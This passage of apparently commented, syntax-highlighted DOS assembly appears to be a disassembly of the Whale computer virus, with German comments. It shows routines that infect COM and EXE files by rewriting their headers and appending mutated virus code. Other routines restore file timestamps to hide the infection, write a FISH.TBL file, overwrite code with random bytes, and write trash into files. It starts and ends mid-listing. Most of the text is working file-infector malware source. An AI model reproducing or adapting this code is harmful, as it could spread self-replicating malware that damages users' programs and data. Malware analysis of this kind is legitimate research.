                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileTime</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Uhrzeit</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; SEEK Fileanfang</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileDate</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; Read file</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">CodBuf</span><span class="sc0">        </span><span class="sc1">; nach DS:DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">; 1C byte ( EXE-Header ! )</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; Weils so schoen war ...</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">; diesmal nach DS:0004 lesen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; == CS:2814</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; seek file-Ende</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; FileSize merken</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; BEISPIEL : AX=9273 -&gt; DI=9273</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">000Fh</span><span class="sc0">        </span><span class="sc1">; AX=9282</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; öbertrag nach DX</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">       </span><span class="sc1">; AX=9280</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; DI=FFF3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">        </span><span class="sc1">; CX=10</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; AX=928 = Anzahl Paras fÅr File</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; SI=928</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">57</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( Infektion )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">58</span><span class="sc0">
</span><span class="sc1">;*****************************************</span><span class="sc0">
</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">CODE_58</span><span class="sc0">     </span><span class="sc1">;************************* e-i-n-g-e-f-Å-g-t-</span><span class="sc0">
</span><span class="sc1">;*****************************************</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; SEEK File-Anfang</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; CX=DX=0</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; INT 21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">; 1C Byte</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Write to File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">CodBuf</span><span class="sc0">        </span><span class="sc1">; EXE-Header / COM-Start</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; INT 21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                      </span><span class="sc1">; AX = AX * maxparas</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; DX = Offset CodBuf</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; SEEK from start to CX:DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; INT 21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">CodBuf</span><span class="sc0">        </span><span class="sc1">; CX = CodBuf</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; DX = 0</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">                   </span><span class="sc1">; CX = Offset CodBuf+DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; WRITE-FILE</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Mutate_Whale</span><span class="sc0">            </span><span class="sc1">; Mutieren</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">@10_Prozent</span><span class="sc0">             </span><span class="sc1">; jedes 10. Mal Wal</span><span class="sc0">
                                                </span><span class="sc1">; zerstîren</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Suche_Fish</span><span class="sc0">              </span><span class="sc1">; Jedes 4. Mal FISH.TBL</span><span class="sc0">
                                                </span><span class="sc1">; schreiben</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">InfectFlag</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; "habe infiziert"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2433</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; VerschlÅsseln, schreiben,</span><span class="sc0">
                                                </span><span class="sc1">; entschlÅsseln !</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2579</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0491A</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;----------------------------( Wal-Code zerstîren )---</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">SwapCode_5</span><span class="sc4">],</span><span class="sc2">0CCh</span><span class="sc0">   </span><span class="sc1">; 3259  , 0e8h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">SwapCode_2</span><span class="sc4">],</span><span class="sc2">0C6h</span><span class="sc0">   </span><span class="sc1">; 3A20  , 0e9h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">SWAPCODE_6</span><span class="sc4">],</span><span class="sc2">0CCh</span><span class="sc0">   </span><span class="sc1">; 2cff  , 0c3h</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Kill_Int_Table</span><span class="sc0">  </span><span class="sc1">; nur eine einzige Infektion</span><span class="sc0">
</span><span class="sc5">Code_58</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">58</span><span class="sc0">              </span><span class="sc1">; pro Session !</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================( Zerstîren des Wals )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PATCH</span><span class="sc0">                   </span><span class="sc1">; gepatchten code</span><span class="sc0">
                                                </span><span class="sc1">; zerstîren</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">SWAPCODE_4</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0EF15h</span><span class="sc0"> </span><span class="sc1">; PATCH zerstîren</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4568h</span><span class="sc0">  </span><span class="sc1">; ---""-----------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">SwapCode_1</span><span class="sc4">],</span><span class="sc2">03Dh</span><span class="sc0">
                                                </span><span class="sc1">; DECODE zerstîren</span><span class="sc0">
                </span><span class="sc1">;=====( eigentliche infektion )=======================</span><span class="sc0">
                                           </span><span class="sc1">;=========================;</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Code_Whale</span><span class="sc0">         </span><span class="sc1">; Whale kodieren          ;</span><span class="sc0">
                                           </span><span class="sc1">; aber NICHT LauffÑhig !! ;</span><span class="sc0">
                                           </span><span class="sc1">;=========================;</span><span class="sc0">

                </span><span class="sc1">;-------------------------( und rÅckgÑngig machen )---</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">SwapCode_1</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">4568h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0EF15h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">SwapCode_3</span><span class="sc0">                     </span><span class="sc1">; SI = 210Ah</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PATCH</span><span class="sc0">
                </span><span class="sc1">;=====================================================</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">59</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc5">D2579</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Write_Trash_To_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">; SET FILEDATUM !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileDate</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; Stunde &gt; 16 ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J038C3</span><span class="sc0">                  </span><span class="sc1">; jmp, wenn nicht</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TrashFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J038C3</span><span class="sc0">                  </span><span class="sc1">; TrashFlag = "1" :jmp</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; Stunde=Stunde-16</span><span class="sc0">
</span><span class="sc5">J038C3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set Filedatum</span><span class="sc0">
</span><span class="sc5">CODE_59</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">59</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================( Den Whale-Code zerstîren , bei der  )===</span><span class="sc0">
</span><span class="sc1">;===========================( Infektion jedes 10. COM-Files       )===</span><span class="sc0">
</span><span class="sc1">;===========================( Zweck :  Geburtenkontrolle !        )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">@10_Prozent</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TrashFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Exe_Flag</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0390E</span><span class="sc0">          </span><span class="sc1">; Jmp, wenn EXE-File</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">          </span><span class="sc1">; 90 % liegen Åber 19h</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J0390E</span><span class="sc0">          </span><span class="sc1">; fertig, nichts weiter tun</span><span class="sc0">
</span><span class="sc1">;-------------------------------------( Wal zerstîrt seinen Code )---</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">TrashFlag</span><span class="sc4">]</span><span class="sc1">; ist jetzt "1"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0016h</span><span class="sc0">

</span><span class="sc5">J038F4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; 16h Byte von CS:281A..2830</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; durch Zufallszahlen Åberschreiben</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J038F4</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0001h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">  </span><span class="sc1">; dito den JMP bei CS:2811</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">J0390E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">60</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03916</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0F2H</span><span class="sc0">   </span><span class="sc1">;JMP     J02BB6 =&gt; Nirwana</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------( Hmmmmm ) ---</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03919</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;       JZ      J03916  ; =&gt; Nirwana !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc0">           </span><span class="sc1">; DX &lt;- DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; AX = 20h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; DX = DS:100</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; DS = DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; BX:=0030:011C, DAS IST DER</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; TASTATURPUFFER ( 40:1C) !</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; es testet den Tastaturpuffer</span><span class="sc0">
</span><span class="sc1">;********************************************************************</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;**** EINGEFöGT *************</span><span class="sc0">
</span><span class="sc1">;********************************************************************</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03936</span><span class="sc0">          </span><span class="sc1">; dann direkt in die Dekode-Routine</span><span class="sc0">
                                        </span><span class="sc1">; mit SI als Returnadresse</span><span class="sc0">
